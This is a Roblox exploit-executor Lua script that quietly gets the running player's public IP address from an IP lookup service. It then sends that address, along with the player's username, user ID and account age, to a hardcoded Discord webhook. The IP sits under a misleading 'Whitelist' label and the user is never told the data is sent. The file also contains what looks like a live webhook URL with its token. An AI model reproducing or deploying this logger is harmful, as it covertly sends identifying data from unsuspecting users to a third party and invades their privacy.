local ip = tostring(game:HttpGet("https://api.ipify.org", true))
local player = game.Players.LocalPlayer
 



local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1020369992543371436/TiJgRgrF18AOwoMJtsuG4HjprkwYf642IDaA3Ar_E22dICMC38hi4MiqQ_tbuSkFccfX"
local data = {
   ["content"] = "Execution Detected",
   ['url'] = "https://www.roblox.com/users/".. player.UserId .. "/profile",
   ['embeds'] = {{
            ['author'] = {
                ['name'] = player.Name,
                ['icon_url'] = "https://media.discordapp.net/attachments/1011717671697535108/1014541860145995848/unknown.png?width=129&height=129",

            },
            ['description'] = "User Location: ",

            ['type'] = "rich",
    ['fields'] = {
                    {
                        ['name'] = "Account age: ",
                        ['value'] = player.AccountAge .. " Days old",
                        ['inline'] = true,
                    },
                    {
                        ['name'] = "Account ID: ",
                        ['value'] = player.UserId ,
                        ['inline'] = true,
                    },

                    {

                        ['name'] = "Whitelist: ",
                        ['value'] = ip,
                        ['inline'] = true,
                    },

        }}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
